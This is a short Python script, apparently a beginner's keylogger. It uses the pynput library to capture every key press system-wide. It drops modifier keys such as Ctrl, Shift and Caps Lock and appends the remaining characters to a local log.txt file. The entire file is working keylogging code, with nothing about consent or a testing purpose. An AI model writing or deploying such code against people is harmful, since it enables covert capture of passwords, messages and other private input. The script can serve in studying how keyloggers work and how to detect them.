from pynput.keyboard import Listener, Key

def writetofile(key):
    letter = str(key)
    letter = letter.replace("'", "")

    # Define a dictionary to map replacement keys
    replacements = {
        'Key.ctrl_l': '',  # Replace Left Control with nothing
        'Key.ctrl_r': '',  # Replace Right Control with nothing
        'Key.shift': '',    # Replace Shift with nothing (consider security implications)
        'Key.shift_l': '',  # Replace Left Shift with nothing (consider security implications)
        'Key.space': ' ',   # Replace Space with a space
        'Key.shift_r': '',  # Replace Right Shift with nothing (consider security implications)
        'Key.caps_lock': '' # Replace Caps Lock with nothing
    }

    # Check if the key has a replacement in the dictionary
    if letter in replacements:
        letter = replacements[letter]

    with open("log.txt", "a") as f:
        f.write(letter)

with Listener(on_press=writetofile) as l:
    l.join()
